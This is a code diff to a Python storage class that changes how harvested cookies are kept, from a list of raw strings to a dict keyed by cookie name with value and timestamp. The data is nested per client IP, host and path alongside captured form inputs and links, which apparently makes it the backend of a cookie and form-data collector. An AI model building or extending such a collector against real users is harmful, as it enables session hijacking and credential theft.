@@ -10,13 +10,17 @@ class ElementType(TypedDict):
     attributes: List[Tuple[str, str]]
     value: str
 
+class CookieType(TypedDict):
+    value: str
+    last_updated: int
+
 class DataCollectionType(TypedDict):
     inputs: List[Tuple[int, str, List[ElementType]]]
-    cookies: List[Tuple[int, str, str]]
+    cookies: Dict[str, CookieType]
     href: List[Tuple[int, str]]
 
 def newDataCollectionType() -> DataCollectionType:
-    return DataCollectionType(inputs=[], cookies=[], href=[])
+    return DataCollectionType(inputs=[], cookies={}, href=[])
 
 StorageDataType = Dict[str, Dict[str, Dict[str, DataCollectionType]]]
 
@@ -79,11 +83,12 @@ class Storage:
                 ))
         elif data["type"] == ScrapeTypeEnum.COOKIES:
             for cookie in data["data"][0].split(";"):
-                self.__data[ip][url.netloc][url.path]["cookies"].append((
-                    data["time"],
-                    data["href"],
-                    cookie,
-                ))
+                # clean the cookie and update its value
+                key, value = cookie.lstrip(" ").split("=", 1)
+                self.__data[ip][url.netloc][url.path]["cookies"][key] = {
+                    "value": value,
+                    "last_updated": data["time"],
+                }
             self.__data[ip][url.netloc][url.path]["href"].append((
                 data["time"],
                 data["href"],
